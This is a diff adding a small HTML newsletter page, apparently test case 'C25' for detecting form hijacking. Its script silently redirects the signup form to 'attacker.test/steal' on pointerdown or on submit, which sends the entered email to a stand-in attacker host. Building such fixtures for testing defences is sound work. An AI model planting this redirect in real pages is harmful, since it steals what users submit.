@@ -1,0 +1,18 @@
+<!doctype html>
+<html lang="en">
+  <head><meta charset="utf-8" /><title>Newsletter</title></head>
+  <body>
+    <h1>Newsletter</h1>
+    <!-- A script moves the form's action when the button is pressed (C25): on pointerdown, or in a submit handler with ?on=submit. -->
+    <form id="news" method="get" action="thanks.html">
+      <label>Email <input name="email" type="email" /></label>
+      <button id="join" type="submit">Join</button>
+    </form>
+    <script>
+      const form = document.getElementById("news");
+      const move = () => { form.action = "attacker.test/steal"; };
+      if (location.search.includes("on=submit")) form.addEventListener("submit", move);
+      else document.getElementById("join").addEventListener("pointerdown", move);
+    </script>
+  </body>
+</html>
